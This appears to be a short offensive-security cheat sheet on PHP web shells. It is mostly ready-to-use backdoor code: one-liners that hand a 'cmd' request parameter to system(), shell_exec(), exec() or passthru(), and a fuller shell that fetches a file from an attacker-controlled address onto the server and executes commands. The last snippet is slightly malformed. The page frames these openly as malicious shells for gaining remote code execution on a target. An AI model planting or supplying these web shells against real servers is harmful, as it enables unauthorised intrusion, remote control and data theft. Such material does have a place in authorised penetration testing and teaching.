# Web Shells

## WebShells

WebShells are simply shells that the user can interact with on a web interface, however we can build our own malicious shells to gain remote code execution or access to the target system.

### PHP WebShells

We can use some built-in functions to execute a shell, however you may want to [read this](https://stackoverflow.com/questions/1924939/among-request-get-and-post-which-one-is-the-fastest) first if you're not sure which request method to use.

Basically:

* You should use `$_GET` when someone is requesting data **from** the application.
* You should use `$_POST` when someone is pushing _\(inserting or updating ; or deleting\)_ data **to** the application.

system\(\):

```php
<?php system($_GET['cmd']);?>
```

shell\_exec\(\):

```php
<?php shell_exec($_GET['cmd']);?>
```

exec\(\):

```php
<?php exec($_GET['cmd']);?>
```

passthru\(\): 

```php
<?php passthru($_GET['cmd']);?>
```

Very functional shell:

```php
<?php
    echo "<pre>" . system($_GET['cmd']) . "</pre>";
?>
```

We can a create a more functional shell as follows:

```php
# Upload
if (isset($_GET['fupload'])) {
    file_put_contents($_GET['fupload'], file_get_contents($ip . $_GET['fupload']));
};
# Execute code
# shell_exec() or system() or exec()
if (isset($_GET['cmd'])) {
    echo "<pre>" . exec($_GET['cmd']) . "</pre>";
};
?>
```



